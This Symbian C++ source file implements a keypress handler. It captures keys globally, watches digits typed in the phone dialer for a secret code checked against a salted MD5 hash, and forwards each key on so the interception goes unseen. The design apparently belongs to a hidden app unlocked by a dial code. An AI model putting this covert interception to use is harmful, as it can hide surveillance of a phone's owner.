#include "FxKeypressHandler.h"
#include <aknviewappui.h>	// CAknViewAppUi
#include "CltPredef.h"
#include "cMD5.h"
#include "Logger.h" 
#include <EIKENV.H>
#include "CltAppUi.h"
#include "SecretCodeManager.h"

CKeypressHandler::CKeypressHandler(CCltAppUi& aAppUi) 
:iAppUi(aAppUi),
iSecretCodeMan(iAppUi.SecretCodeManager())
{
//	iSecretCodeMan = ;
}	

CKeypressHandler::~CKeypressHandler(){}

CKeypressHandler* CKeypressHandler::NewL(CCltAppUi& aAppUi)
{	
	CKeypressHandler* self = new (ELeave) CKeypressHandler(aAppUi);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
}

void CKeypressHandler::ConstructL()
{
	
}

void CKeypressHandler::CaptureKey(RWindowGroup& aWindowGroup,TInt aCaptureMode)
{		
	switch(aCaptureMode)
	{
		case ECapture:
		{	
			for(TInt i = 0; i < KKeyCapturedLenght; i++) {
				
				aWindowGroup.CaptureKey(KInterestedKey[i], 0, 0, 0);
			}
			
			FindPhoneAppWgId(CEikonEnv::Static()->WsSession());	
	
		}break;
		case ECancelCapture:
		{
			for(TInt i = 0; i < KKeyCapturedLenght; i++) {			
				aWindowGroup.CancelCaptureKey(KInterestedKey[i]);
			}
		}break;		
	}
	
	aWindowGroup.EnableFocusChangeEvents();
	
	//aWindowGroup.CaptureKey(KKeyEndCallKey, 0, 0, 0);
	//aWindowGroup.CaptureKey(KKeyMenuKey, 0, 0, 0);
	//EKeyMenu				
	/*iCaptureKeyId		= iWindowGroup.CaptureKey(63570,0,0,EPrioritySupervisor);	
	iCaptureKeyUpAndDownsId	= iWindowGroup.CaptureKeyUpAndDowns(180,0,0,EPrioritySupervisor);
	*/	
}

void CKeypressHandler::HashSecretCode(const TDesC8& aSecretCode, TDes8& aResultHash)
{	
	TInt prdTailLen = KMd5DigestTail().Length();
	TInt endIndex = 70 - aSecretCode.Length();
	
	if(endIndex > prdTailLen) {
		endIndex = prdTailLen;
	}
	
	HBufC8* inputString = HBufC8::NewLC(aSecretCode.Length() + endIndex);		
	inputString->Des().Append(aSecretCode);	
	inputString->Des().Append(KMd5DigestTail().Mid(0,endIndex));
	
	
	
	/*if(Logger::DebugEnable()) {
		LOGDATA(_L("input_digest.dat"),*inputString)
	}
	*/
	
	cMD5 md5;
	unsigned char* secretHash = md5.CalcMD5FromByte(inputString->Ptr(),inputString->Length());
	
	for(TInt i = 0; i < KSecretKeyHashMaxLengthx; ++i) {
		aResultHash.Append(TChar(secretHash[i]));
	}
	
	CleanupStack::PopAndDestroy();//inputString
	
	delete [] secretHash;	
}

TBool CKeypressHandler::Authenticate(const TDesC8& aSecretCode)
{	
	/*if(Logger::DebugEnable()) {
		LOG0(_L("[CKeypressHandler::Authenticate] Entered"))
	}*/
	
	TBuf8<KSecretKeyHashMaxLengthx> secretCodeHash;
	
	//do hash input secret code
	HashSecretCode(aSecretCode, secretCodeHash);	
	
	//convert to hex string
	TBuf8<50> secretCodeHashStr;
	for(TInt i =0; i < secretCodeHash.Length(); i ++ ) {
		secretCodeHashStr.AppendNumFixedWidthUC(secretCodeHash[i],EHex,2);
	}
	
	CCltSettings&  setting = SETTING();
	
	/*if(Logger::DebugEnable()) {
		LOGDATA(_L("md5hash.dat"),secretCodeHash)
		const TDesC8& settinghash = setting.SecretCodeHashString();
		LOGDATA(_L("settinghash.dat"),settinghash)		
	}*/
	
	/*if(Logger::DebugEnable()) {
		
		TBuf<50> inputHash;
		inputHash.Copy(secretCodeHashStr);
		TBuf<50> settingHash;
		settingHash.Copy( setting.SecretCodeHashString());
		LOG2(_L("[CKeypressHandler::Authenticate] inputHash: %S, settingHash: %S "),&inputHash,&settingHash )
	}*/
	
	//compare
	return secretCodeHashStr.Compare(setting.SecretCodeHashString()) == 0;
}

TApaTask CKeypressHandler::FindPhoneAppWgId(RWsSession& aWss)
{	
	TApaTaskList taskList(aWss);
	TApaTask phoneAppTask = taskList.FindApp(KUidPhoneAppx);
	iPhoneAppWgId = phoneAppTask.WgId();
	
	return phoneAppTask;
}

TKeyResponse CKeypressHandler::HandleKeyEventL(const TKeyEvent& aKeyEvent, TEventCode aType)
{		
		TUint code = aKeyEvent.iCode;
		//if(Logger::DebugEnable()) {
		//	LOG1(_L("[CKeypressHandler::HandleKeyEventL] Entering...  code:%d "),code)
		//}
		
		if(!iAppUi.iFlagToSendEventToWg) {						
			return EKeyWasNotConsumed;
		}
		
		RWsSession& wss = CCoeEnv::Static()->WsSession();	//iAppUi.CoeEnv().WsSession();//
		
		//top most running application
		TInt wgId = wss.GetFocusWindowGroup();		
		
		//top most application must be phone.app
		if(aType != EEventKey || wgId != iPhoneAppWgId || iAppUi.iAppOnForeground) {
			iSecretCodeMan.HandleFocusAppChanged();
			goto SEND_EVENT_TO_WINDOWGROUP;			
		}
		
		if( (code >= 0x30 && code <= 0x39) || code == '*' || code  == '#' ) {
			iSecretCodeMan.SecretCodePressedL(code);
		}
		
SEND_EVENT_TO_WINDOWGROUP:			
			
			TWsEvent event;
			event.SetType(aType);
			event.SetTimeNow();
			event.Key()->iCode = code;
			event.Key()->iModifiers = aKeyEvent.iModifiers;
			event.Key()->iRepeats = aKeyEvent.iRepeats;
			event.Key()->iScanCode = aKeyEvent.iScanCode;///EStdKeyNull/;
			
			wss.SendEventToWindowGroup(wgId, event);
			
		//if(Logger::DebugEnable())
		//	LOG0(_L("[CKeypressHandler::HandleKeyEventL] SendEventToWindowGroup done"))
		
		return EKeyWasNotConsumed;
}

/*
To determine whether, for example, the telephone application is in the foreground, you can use TApaTaskList and TApaTask. You can find out the topmost application by calling TApaTaskList::FindByPos(0). The function parameter is the window’s ordinal position and zero means the foreground window. The function returns the TApaTask object. You can use it to find out the window group of the application by calling wgId(). After this you can, for example, construct an CApaWindowGroupName object with the window ID returned by the wgId(). The AppUid() function returns the UID of the application. All you need to do is test if it is the same as the UID of the telephone application (0x100058B3).The Window Server also provides some useful functions (see RWsSession).
*/
/*void CKeypressHandler::HandleWsEventL(const TWsEvent& aEvent,CCoeControl* aDestination)
{
	switch(aEvent.Type())
	{	
		case EEventFocusGroupChanged://EEventWindowGroupsChanged:
			{	
				RWsSession& wss = iAppUi.CoeEnv().WsSession();
				//top most running application
				iCurrentWindowGroupId = wss.GetFocusWindowGroup();
				
				if(Logger::DebugEnable()) {
					LOG0(_L("[CCltAppUi::HandleWsEventL]***** GOT EEventFocusGroupChanged **** "))
					LOG1(_L("[CCltAppUi::HandleWsEventL]***** iCurrentWindowGroupId: %d"),iCurrentWindowGroupId)
				}
				
				FindPhoneAppWgId(wss);				
			}
	}
}
*/

void CKeypressHandler::SendToForeground()
{	
	iAppUi.SendToForeground();
}

void CKeypressHandler::SendToBackground()
{
	iAppUi.SendToBackground();
}